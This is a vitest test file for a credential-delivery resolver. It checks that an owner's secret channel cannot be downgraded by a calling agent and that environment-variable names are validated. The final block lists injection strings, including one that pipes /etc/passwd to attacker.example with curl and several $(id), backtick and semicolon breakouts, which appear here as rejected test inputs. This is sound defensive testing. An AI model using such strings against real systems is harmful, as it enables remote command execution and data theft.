import { describe, it, expect } from 'vitest';
import { resolveDeliveryConfig, isValidMechanism, isValidEnvKey } from '../src/exec.js';

// The entry's exec_config is set by the OWNER in the dashboard. inject_as is chosen
// by the CALLING AGENT. If the agent's choice wins, the owner's "deliver this over
// stdin only" is a suggestion — and an agent that asks for `env` gets the secret
// somewhere /proc/<pid>/environ and every child process can read it.

function ok(r: ReturnType<typeof resolveDeliveryConfig>) {
  if (!r.ok) throw new Error(`expected success, got: ${r.error}`);
  return r;
}

describe('resolveDeliveryConfig — the owner has set no channel', () => {
  it('lets the agent choose', () => {
    const r = ok(resolveDeliveryConfig(undefined, { mechanism: 'env', env_key: 'TOKEN' }));
    expect(r.cfg?.mechanism).toBe('env');
    expect(r.ignoredOverride).toBeUndefined();
  });

  it('still keeps the owner non-delivery fields the agent did not supply', () => {
    const r = ok(resolveDeliveryConfig(
      { env_key: 'OWNER', post_command: 'cleanup' },
      { mechanism: 'env' },
    ));
    expect(r.cfg?.env_key).toBe('OWNER');
    expect(r.cfg?.post_command).toBe('cleanup');
  });

  it('falls back to the entry config when the agent asks for nothing', () => {
    expect(ok(resolveDeliveryConfig({ credential_type: 'sudo' }, undefined)).cfg?.credential_type).toBe('sudo');
  });
});

describe('resolveDeliveryConfig — the owner channel is a ceiling', () => {
  // Door 1: override the recipe.
  it('refuses to let credential_type be downgraded to env', () => {
    const r = ok(resolveDeliveryConfig({ credential_type: 'sudo' }, { credential_type: 'generic', env_key: 'PWNED' }));
    expect(r.cfg?.credential_type).toBe('sudo');
    expect(r.ignoredOverride).toEqual({ asked: 'generic', enforced: 'sudo' });
  });

  // Door 2: skip the recipe and name the raw mechanism instead. Overriding only
  // credential_type would leave this one open.
  it('refuses the raw mechanism escape hatch against a recipe entry', () => {
    const r = ok(resolveDeliveryConfig({ credential_type: 'sudo' }, { mechanism: 'env', env_key: 'PWNED' }));
    expect(r.cfg?.credential_type).toBe('sudo');
    expect(r.cfg?.mechanism).toBeUndefined();
    expect(r.ignoredOverride).toEqual({ asked: 'env', enforced: 'sudo' });
  });

  it('protects an entry that names its channel via mechanism', () => {
    const r = ok(resolveDeliveryConfig({ mechanism: 'stdin' }, { mechanism: 'env', env_key: 'PWNED' }));
    expect(r.cfg?.mechanism).toBe('stdin');
    expect(r.ignoredOverride).toEqual({ asked: 'env', enforced: 'stdin' });
  });

  // Sending BOTH fields hid the conflict: `asked` read the first one and reported nothing.
  it('reports the conflict when the agent sends a matching type AND a weakening mechanism', () => {
    const r = ok(resolveDeliveryConfig({ credential_type: 'sudo' }, { credential_type: 'sudo', mechanism: 'env' }));
    expect(r.cfg?.credential_type).toBe('sudo');
    expect(r.cfg?.mechanism).toBeUndefined();
    expect(r.ignoredOverride).toEqual({ asked: 'env', enforced: 'sudo' });
  });

  it('does not warn when the agent asks for what the owner already set', () => {
    const r = ok(resolveDeliveryConfig({ credential_type: 'sudo' }, { credential_type: 'sudo' }));
    expect(r.ignoredOverride).toBeUndefined();
  });

  it('overrides an agent askpass_var with the owner one', () => {
    const r = ok(resolveDeliveryConfig(
      { credential_type: 'ssh-passphrase', askpass_var: 'SSH_ASKPASS' },
      { askpass_var: 'EVIL_ASKPASS' },
    ));
    expect(r.cfg?.askpass_var).toBe('SSH_ASKPASS');
  });

  it('keeps negotiable fields while pinning the channel', () => {
    const r = ok(resolveDeliveryConfig({ credential_type: 'git' }, { mechanism: 'env', env_key: 'FROM_AGENT', pre_command: 'echo hi' }));
    expect(r.cfg?.credential_type).toBe('git');
    expect(r.cfg?.env_key).toBe('FROM_AGENT');
    expect(r.cfg?.pre_command).toBe('echo hi');
  });

  it("prefers the owner env_key over the agent one", () => {
    const r = ok(resolveDeliveryConfig({ credential_type: 'generic', env_key: 'OWNER_KEY' }, { env_key: 'AGENT_KEY' }));
    expect(r.cfg?.env_key).toBe('OWNER_KEY');
  });
});

describe('resolveDeliveryConfig — malformed config must not fail open', () => {
  // The bottom of the dispatch chain is `env`, so anything unrecognised that reaches
  // it is delivered the least confidential way. Reject instead.
  it('rejects an unknown mechanism in the entry config', () => {
    const r = resolveDeliveryConfig({ mechanism: 'future-channel' as never, env_key: 'TOKEN' }, undefined);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain('unknown delivery mechanism');
  });

  it('rejects an unknown mechanism from the agent', () => {
    const r = resolveDeliveryConfig(undefined, { mechanism: 'sneaky' as never, env_key: 'TOKEN' });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain('Unknown delivery mechanism');
  });

  // A dashboard that serialises "no recipe selected" as "" must not read as
  // "this entry names no channel" while a real mechanism sits beside it.
  it('treats an empty credential_type as absent without discarding the owner mechanism', () => {
    const r = ok(resolveDeliveryConfig({ credential_type: '', mechanism: 'stdin' }, { mechanism: 'env', env_key: 'PWNED' }));
    expect(r.cfg?.mechanism).toBe('stdin');
    expect(r.ignoredOverride).toEqual({ asked: 'env', enforced: 'stdin' });
  });

  it('treats a whitespace-only credential_type as absent', () => {
    const r = ok(resolveDeliveryConfig({ credential_type: '   ', mechanism: 'stdin' }, { mechanism: 'env' }));
    expect(r.cfg?.mechanism).toBe('stdin');
  });
});

describe('isValidMechanism', () => {
  it('accepts exactly the three real channels', () => {
    expect(['env', 'stdin', 'askpass'].every(isValidMechanism)).toBe(true);
  });
  it('rejects anything else', () => {
    for (const v of ['', 'ENV', 'file', null, undefined, 42, {}]) {
      expect(isValidMechanism(v)).toBe(false);
    }
  });
});

describe('env var names are interpolated, so they are validated', () => {
  // env_key lands inside `export <key>='<secret>'` in the remote SSH script and inside
  // `<key>=<secret>` in a config file. The shell-escape screen only ever looked at
  // `command`, so an unchecked key was remote command execution with a semicolon.
  it('accepts ordinary shell identifiers', () => {
    for (const k of ['TOKEN', '_x', 'NPM_TOKEN', 'a1_B2']) {
      expect(isValidEnvKey(k), k).toBe(true);
    }
  });

  it('rejects a key that would break out of the remote export line', () => {
    for (const k of [
      "X='' ; curl attacker.example -d @/etc/passwd ; Y",
      'X`id`',
      'X$(id)',
      'X;id',
      'X|id',
    ]) {
      expect(isValidEnvKey(k), k).toBe(false);
    }
  });

  it('rejects a key that would write extra config lines', () => {
    for (const k of ['A\nNODE_OPTIONS', 'A\r\nB', 'A=B', 'A B']) {
      expect(isValidEnvKey(k), JSON.stringify(k)).toBe(false);
    }
  });

  it('rejects empty, numeric-leading and over-long keys', () => {
    expect(isValidEnvKey('')).toBe(false);
    expect(isValidEnvKey('1ABC')).toBe(false);
    expect(isValidEnvKey('A'.repeat(129))).toBe(false);
    expect(isValidEnvKey(undefined)).toBe(false);
    expect(isValidEnvKey(42)).toBe(false);
  });
});
